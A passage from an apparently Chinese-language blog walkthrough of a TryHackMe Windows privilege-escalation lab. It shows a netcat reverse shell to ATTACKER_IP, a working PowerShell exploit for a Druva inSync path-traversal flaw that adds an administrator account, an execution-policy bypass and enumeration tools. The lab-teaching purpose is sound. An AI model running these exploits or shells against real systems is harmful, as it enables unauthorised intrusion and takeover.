<p><code>-p</code> 参数指定漏洞利用程序运行的可执行文件，在本例中为 <code>nc64.exe</code> 。 <code>-a</code> 参数用于将参数传递给可执行文件。由于我们希望 nc64 针对攻击者机器建立反向 shell，因此传递给 netcat 的参数将为 <code>-e cmd.exe ATTACKER_IP 4442</code> 。</p>
<p>如果一切设置正确，您应该会得到一个具有 SYSTEM 权限的 shell：</p>
<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs scss">user<span class="hljs-keyword">@attackerpc</span>$ nc -lvp <span class="hljs-number">4442</span><br>Listening on <span class="hljs-number">0.0</span>.<span class="hljs-number">0.0</span> <span class="hljs-number">4442</span><br>Connection received on <span class="hljs-number">10.10</span>.<span class="hljs-number">175.90</span> <span class="hljs-number">49755</span><br>Microsoft Windows [Version <span class="hljs-number">10.0</span>.<span class="hljs-number">17763.1821</span>]<br>(c) <span class="hljs-number">2018</span> Microsoft Corporation. All rights reserved.<br><br><span class="hljs-attribute">c</span>:\windows\system32\inetsrv&gt;whoami<br>nt authority\system<br></code></pre></td></tr></table></figure>
<h2 id="4-10-未打补丁的软件"><a href="#4-10-未打补丁的软件" class="headerlink" title="4-10-未打补丁的软件"></a>4.10 未打补丁的软件</h2>
<p>目标系统上安装的软件可以提供各种权限升级机会。与驱动程序一样，组织和用户可能不会像更新操作系统那样频繁地更新它们。您可以使用 <code>wmic</code> 工具列出目标系统上安装的软件及其版本。下面的命令将转储它可以在已安装的软件上收集的信息（可能需要大约一分钟才能完成）：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell-session">wmic product get name,version,vendor<br></code></pre></td></tr></table></figure>
<p>Remember that the <code>wmic product</code> command may not return all installed programs. Depending on how some of the programs were installed, they might not get listed here. It is always worth checking desktop shortcuts, available services or generally any trace that indicates the existence of additional software that might be vulnerable.<br>
请记住， <code>wmic product</code> 命令可能不会返回所有已安装的程序。根据某些程序的安装方式，它们可能不会在此处列出。检查桌面快捷方式、可用服务或任何表明存在可能易受攻击的其他软件的痕迹始终是值得的。</p>
<p>一旦我们收集了产品版本信息，我们就可以随时在 <a target="_blank" rel="noopener" href="https://www.exploit-db.com/">exploit-db</a>, <a target="_blank" rel="noopener" href="https://packetstormsecurity.com/">packet storm</a> 和 <a target="_blank" rel="noopener" href="https://www.google.com/">Google</a>,等网站上在线搜索已安装软件的现有漏洞。</p>
<h3 id="Example：Druva-inSync-6-6-3"><a href="#Example：Druva-inSync-6-6-3" class="headerlink" title="Example：Druva-inSync-6-6-3"></a>Example：Druva inSync 6.6.3</h3>
<p>目标服务器正在运行 Druva inSync 6.6.3，据 Matteo Malvica 报告，该服务器容易受到权限升级的影响。该漏洞是由于对 Chris Lyne 最初针对 6.5.0 版本报告的另一个漏洞应用了错误补丁而导致的。</p>
<p>该软件容易受到攻击，因为它以系统权限在端口 6064 上运行 RPC（远程过程调用）服务器，只能从本地主机访问。如果您不熟悉 RPC，它只是一种允许给定进程通过网络公开函数（RPC 行话中称为过程）的机制，以便其他计算机可以远程调用它们。</p>
<p>对于 Druva inSync，端口 6064 上公开的过程之一（特别是过程号 5）允许任何人请求执行任何命令。由于 RPC 服务器以 SYSTEM 身份运行，因此任何命令都以 SYSTEM 权限执行。</p>
<p>6.5.0 及更早版本中报告的原始漏洞允许不受限制地运行任何命令。提供此类功能的最初想法是远程执行 inSync 提供的一些特定二进制文件，而不是任何命令。尽管如此，仍然没有进行任何检查来确保这一点。</p>
<p>发布了一个补丁，他们决定检查执行的命令是否以字符串 <code>C:\ProgramData\Druva\inSync4\</code> 开头，这是允许的二进制文件应该在的地方。但是，事实证明这还不够，因为您可以简单地进行路径遍历攻击来绕过这种控制。假设你要执行 <code>C:\Windows\System32\cmd.exe</code> ，它不在允许的路径中；您只需要求服务器运行 <code>C:\ProgramData\Druva\inSync4\..\..\..\Windows\System32\cmd.exe</code> 即可成功绕过检查。</p>
<p>为了构建一个可行的漏洞利用程序，我们需要了解如何与端口 6064 通信。幸运的是，我们使用的协议很简单，要发送的数据包如下图所示：</p>
<p class='item-img' data-src='https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240206105050216.png'><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240206105050216.png" alt="image-20240206105050216"></p>
<p>第一个数据包只是一个包含固定字符串的 hello 数据包。第二个数据包表明我们想要执行程序 5，因为这是一个易受攻击的程序，它将为我们执行任何命令。最后两个数据包分别用于发送命令的长度和要执行的命令字符串。</p>
<p>最初由 Matteo Malvica 在此发布，可以在目标计算机中使用以下漏洞来提升权限并检索此任务的标志。为了您的方便，以下是原始漏洞利用代码：</p>
<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs scss"><span class="hljs-variable">$ErrorActionPreference</span> = &quot;Stop&quot;<br><br><span class="hljs-variable">$cmd</span> = &quot;net user pwnd /add&quot;<br><br><span class="hljs-variable">$s</span> = New-<span class="hljs-selector-tag">Object</span> System<span class="hljs-selector-class">.Net</span><span class="hljs-selector-class">.Sockets</span><span class="hljs-selector-class">.Socket</span>(<br>    [System.Net.Sockets.AddressFamily]::InterNetwork,<br>    [System.Net.Sockets.SocketType]::Stream,<br>    [System.Net.Sockets.ProtocolType]::Tcp<br>)<br><span class="hljs-variable">$s</span><span class="hljs-selector-class">.Connect</span>(&quot;<span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>&quot;, <span class="hljs-number">6064</span>)<br><br><span class="hljs-variable">$header</span> = <span class="hljs-selector-attr">[System.Text.Encoding]</span>::UTF8.<span class="hljs-built_in">GetBytes</span>(<span class="hljs-string">&quot;inSync PHC RPCW[v0002]&quot;</span>)<br><span class="hljs-variable">$rpcType</span> = [System.Text.Encoding]::UTF8.<span class="hljs-built_in">GetBytes</span>(<span class="hljs-string">&quot;$([char]0x0005)`0`0`0&quot;</span>)<br><span class="hljs-variable">$command</span> = [System.Text.Encoding]::Unicode.<span class="hljs-built_in">GetBytes</span>(<span class="hljs-string">&quot;C:\ProgramData\Druva\inSync4\..\..\..\Windows\System32\cmd.exe /c $cmd&quot;</span>);<br><span class="hljs-variable">$length</span> = <span class="hljs-selector-attr">[System.BitConverter]</span>::<span class="hljs-built_in">GetBytes</span>(<span class="hljs-variable">$command</span>.Length);<br><br><span class="hljs-variable">$s</span><span class="hljs-selector-class">.Send</span>($header)<br><span class="hljs-variable">$s</span><span class="hljs-selector-class">.Send</span>($rpcType)<br><span class="hljs-variable">$s</span><span class="hljs-selector-class">.Send</span>($length)<br><span class="hljs-variable">$s</span><span class="hljs-selector-class">.Send</span>($command)<br></code></pre></td></tr></table></figure>
<p>您可以弹出 Powershell 控制台并直接粘贴漏洞来执行它（该漏洞也可以在目标计算机中的 <code>C:\tools\Druva_inSync_exploit.txt</code> 中找到）。请注意，在 <code>$cmd</code> 变量中指定的漏洞利用的默认负载将在系统中创建一个名为 <code>pwnd</code> 的用户，但不会为其分配管理权限，因此我们可能想要更改有效负载以获得更有用的东西。对于这个房间，我们将更改有效负载以运行以下命令：</p>
<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss">net user pwnd SimplePass123 /add &amp; net localgroup administrators pwnd /add<br></code></pre></td></tr></table></figure>
<p>这将创建密码为 <code>SimplePass123</code> 的用户 <code>pwnd</code> 并将其添加到管理员组中。如果利用成功，您应该能够运行以下命令来验证用户 <code>pwnd</code> 是否存在并且属于管理员组：</p>
<p>Command Prompt 命令提示符</p>
<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs scss">PS C:\&gt; net user pwnd<br>User name                    pwnd<br>Full Name<br>Account active               Yes<br>[...]<br><br>Local Group Memberships      *Administrators       *Users<br>Global Group memberships     *None<br></code></pre></td></tr></table></figure>
<p>最后一步，您可以以管理员身份运行命令提示符：</p>
<p class='item-img' data-src='https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240206105125538.png'><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240206105125538.png" alt="image-20240206105125538"></p>
<h1>0x05 自动化工具</h1>
<p>有几个脚本可以以类似于上一个任务中看到的方式进行系统枚举。这些工具可以缩短枚举过程时间并发现不同的潜在特权升级向量。但是，请记住，自动化工具有时可能会错过权限升级。</p>
<p>以下是一些常用于识别权限升级向量的工具。请随意针对这个房间中的任何机器运行它们，看看结果是否与讨论的攻击向量相匹配。</p>
<h2 id="5-1-WinPEAS"><a href="#5-1-WinPEAS" class="headerlink" title="5-1-WinPEAS"></a>5.1 WinPEAS</h2>
<p>WinPEAS 是一个开发用于枚举目标系统以发现权限提升路径的脚本。您可以找到有关 winPEAS 的更多信息并下载预编译的可执行文件或 .bat 脚本。 WinPEAS 将运行与上一个任务中列出的命令类似的命令并打印其输出。 winPEAS 的输出可能很长，有时难以阅读。这就是为什么最好始终将输出重定向到文件，如下所示：</p>
<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss">C:\&gt; winpeas.exe &gt; outputfile.txt<br></code></pre></td></tr></table></figure>
<p>WinPEAS 可在此处下载：<a target="_blank" rel="noopener" href="https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS">here</a></p>
<h2 id="5-2-PrivescCheck"><a href="#5-2-PrivescCheck" class="headerlink" title="5-2-PrivescCheck"></a>5.2 PrivescCheck</h2>
<p>PrivescCheck 是一个 PowerShell 脚本，用于搜索目标系统上的常见权限升级。它提供了 WinPEAS 的替代方案，无需执行二进制文件。</p>
<p>PrivescCheck 可在此处下载 <a target="_blank" rel="noopener" href="https://github.com/itm4n/PrivescCheck">here</a>.</p>
<p>提醒：要在目标系统上运行 PrivescCheck，您可能需要绕过执行策略限制。为此，您可以使用 <code>Set-ExecutionPolicy</code> cmdlet，如下所示。</p>
<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs scss">PS C:\&gt; Set-ExecutionPolicy Bypass -Scope process -Force<br>PS C:\&gt; . .\PrivescCheck.ps1<br>PS C:\&gt; Invoke-PrivescCheck<br></code></pre></td></tr></table></figure>
<h2 id="5-3-WES-NG"><a href="#5-3-WES-NG" class="headerlink" title="5-3-WES-NG"></a>5.3 WES-NG</h2>
<p>一些漏洞利用建议脚本（例如 winPEAS）将要求您将它们上传到目标系统并在那里运行它们。这可能会导致防病毒软件检测并删除它们。为了避免发出不必要的噪音来吸引注意力，您可能更喜欢使用 WES-NG，它将在您的攻击机器上运行（例如 Kali 或 TryHackMe AttackBox）。</p>
<p>WES-NG 是一个 Python 脚本，可以在此处找到并下载。 <a target="_blank" rel="noopener" href="https://github.com/bitsadmin/wesng">here</a>.</p>
<p>安装后，在使用之前，请键入 <code>wes.py --update</code> 命令来更新数据库。该脚本将引用它创建的数据库来检查是否有缺失的补丁，这些补丁可能会导致您可以利用漏洞来提升您在目标系统上的权限。</p>
<p>要使用该脚本，您需要在目标系统上运行 <code>systeminfo</code> 命令。不要忘记将输出定向到您需要移动到攻击计算机的 .txt 文件。</p>
<p>完成后，<a target="_blank" rel="noopener" href="http://wes.py">wes.py</a> 可以按如下方式运行；</p>
<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss">user<span class="hljs-keyword">@kali</span>$ wes.py systeminfo.txt<br></code></pre></td></tr></table></figure>
<h2 id="5-4-Metasploit-元分析软件"><a href="#5-4-Metasploit-元分析软件" class="headerlink" title="5-4-Metasploit-元分析软件"></a>5.4 Metasploit 元分析软件</h2>
<p>如果目标系统上已有 Meterpreter shell，则可以使用 <code>multi/recon/local_exploit_suggester</code> 模块列出可能影响目标系统的漏洞，并允许您提升目标系统上的权限。</p>
<div id="paginator"></div></div><div id="post-footer"><div id="pages"><div class="footer-link" style="width: 50%;text-align:right;border-right:1px #fe2 solid"><a href="/2024/02/06/THM-Windows%E6%9C%AC%E5%9C%B0%E6%8C%81%E4%B9%85%E6%80%A7/">← 下一篇 THM-Windows本地持久性</a></div><div class="footer-link" style="width: 50%;right:1px;border-left:1px #fe2 solid"><a href="/2024/02/02/%E5%B8%B8%E8%A7%84%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/">常规漏洞学习总结 上一篇 →</a></div></div></div><div id="comments"><div id="waline"></div></div></div><div class="bottom-btn"><div><a class="i-top" id="to-top" onClick="scrolls.scrolltop();" title="回到顶部" style="opacity: 0; display: none;">∧</a><a class="i-index" id="to-index" href="#toc-div" title="文章目录">≡</a><a class="i-color" id="color-mode" onClick="colorMode.change()" title="切换主题"></a></div></div></article><aside><div id="about"><a href="/" id="logo"><img src="https://ak.hypergryph.com/assets/index/images/ak/pc/faction/1.png" alt="Logo"></a><h1 id="Dr"><a href="/">hybcx</a></h1><div id="description"><p></p></div></div><div id="aside-block"><div id="toc-div"><h1>目录</h1><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">1.</span> <span class="toc-text">0x01 前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">2.</span> <span class="toc-text">0x02 简介</span></a></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">3.</span> <span class="toc-text">0x03 Windows用户</span></a></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">4.</span> <span class="toc-text">0x03 Windows密码收集</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#3-1-Windows-installations"><span class="toc-number">4.1.</span> <span class="toc-text">3.1 Windows installations</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-2-Powershell-History"><span class="toc-number">4.2.</span> <span class="toc-text">3.2 Powershell History</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-3-Windows-Credentials"><span class="toc-number">4.3.</span> <span class="toc-text">3.3 Windows Credentials</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-4-IIS-Configuration"><span class="toc-number">4.4.</span> <span class="toc-text">3.4 IIS Configuration</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-5-%E4%BB%8E%E8%BD%AF%E4%BB%B6%E6%A3%80%E7%B4%A2%E5%87%AD%E8%AF%81%EF%BC%9APuTTY"><span class="toc-number">4.5.</span> <span class="toc-text">3.5 从软件检索凭证：PuTTY</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">5.</span> <span class="toc-text">0x04 权限提升</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#4-1-Scheduled-Tasks-%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1"><span class="toc-number">5.1.</span> <span class="toc-text">4.1 Scheduled Tasks -计划任务</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-2-AlwaysInstallElevated-%E5%A7%8B%E7%BB%88%E5%AE%89%E8%A3%85%E6%8F%90%E5%8D%87"><span class="toc-number">5.2.</span> <span class="toc-text">4.2 AlwaysInstallElevated -始终安装提升</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-3-Windows-Services"><span class="toc-number">5.3.</span> <span class="toc-text">4.3 Windows Services</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-4-%E6%9C%8D%E5%8A%A1%E5%8F%AF%E6%89%A7%E8%A1%8C%E6%96%87%E4%BB%B6%E7%9A%84%E4%B8%8D%E5%AE%89%E5%85%A8%E6%9D%83%E9%99%90"><span class="toc-number">5.4.</span> <span class="toc-text">4.4 服务可执行文件的不安全权限</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-5-%E6%9C%AA%E5%8A%A0%E5%BC%95%E5%8F%B7%E7%9A%84%E6%9C%8D%E5%8A%A1%E8%B7%AF%E5%BE%84"><span class="toc-number">5.5.</span> <span class="toc-text">4.5 未加引号的服务路径</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-6-%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84%E6%9C%8D%E5%8A%A1%E6%9D%83%E9%99%90"><span class="toc-number">5.6.</span> <span class="toc-text">4.6 不安全的服务权限</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#tips"><span class="toc-number">5.6.1.</span> <span class="toc-text">tips</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-7-SeBackup-SeRestore"><span class="toc-number">5.7.</span> <span class="toc-text">4.7 SeBackup &#x2F; SeRestore</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-8-SeTakeOwnership"><span class="toc-number">5.8.</span> <span class="toc-text">4.8 SeTakeOwnership</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-9-SeImpersonate-SeAssignPrimaryToken"><span class="toc-number">5.9.</span> <span class="toc-text">4.9 SeImpersonate &#x2F; SeAssignPrimaryToken</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-10-%E6%9C%AA%E6%89%93%E8%A1%A5%E4%B8%81%E7%9A%84%E8%BD%AF%E4%BB%B6"><span class="toc-number">5.10.</span> <span class="toc-text">4.10 未打补丁的软件</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Example%EF%BC%9ADruva-inSync-6-6-3"><span class="toc-number">5.10.1.</span> <span class="toc-text">Example：Druva inSync 6.6.3</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">6.</span> <span class="toc-text">0x05 自动化工具</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#5-1-WinPEAS"><span class="toc-number">6.1.</span> <span class="toc-text">5.1 WinPEAS</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5-2-PrivescCheck"><span class="toc-number">6.2.</span> <span class="toc-text">5.2 PrivescCheck</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5-3-WES-NG"><span class="toc-number">6.3.</span> <span class="toc-text">5.3 WES-NG</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5-4-Metasploit-%E5%85%83%E5%88%86%E6%9E%90%E8%BD%AF%E4%BB%B6"><span class="toc-number">6.4.</span> <span class="toc-text">5.4 Metasploit 元分析软件</span></a></li></ol></li></ol></div></div><footer><nobr>构建自 <a target="_blank" rel="noopener" href="http://hexo.io">Hexo</a></nobr><wbr><nobr> 使用主题 <a target="_blank" rel="noopener" href="https://github.com/Yue-plus/hexo-theme-arknights">Arknights</a></nobr><wbr><nobr>主题作者 <a target="_blank" rel="noopener" href="https://github.com/Yue-plus">Yue_plus</a></nobr></footer></aside><div id="shadow-aside"></div></main><canvas id="canvas-dust"></canvas><script src="/js/search.js"></script><script type="module">import { init } from 'https://unpkg.com/@waline/client@v2/dist/waline.mjs';
window.waline = init;
</script><script src="/js/arknights.js"></script><script src="//unpkg.com/lightgallery@2.7.1/lightgallery.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/zoom/lg-zoom.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/thumbnail/lg-thumbnail.min.js"></script><script src="/js/pjax.js"></script><script class="pjax-js">reset= () => {if (document.querySelector('#waline'))
 waline({
   el: '#waline',
   dark: ':root[theme-mode="dark"]',
   serverURL: 'https://waline-blog-iwqdtxise-hybchenxing.vercel.app',
   path: window.location.pathname,
 });document.querySelector('.lg-container')?.remove()
lightGallery(document.getElementById('post-bg'), {
  plugins: [lgZoom,lgThumbnail],
  selector: '.item-img'})}</script><script>window.addEventListener("load",() => {pjax = new Pjax({
 cacheBust: false,
 selectors: ['title','article','#aside-block','.pjax-js'],
 switches: {'article': Pjax.switches.sideBySide},
 switchesOptions: {
   'article': {
     classNames: {
       remove: "pjax-out",
       add: "pjax-in"
     }
   }
 }
});
document.addEventListener("pjax:complete", reset);reset()})</script></body></html>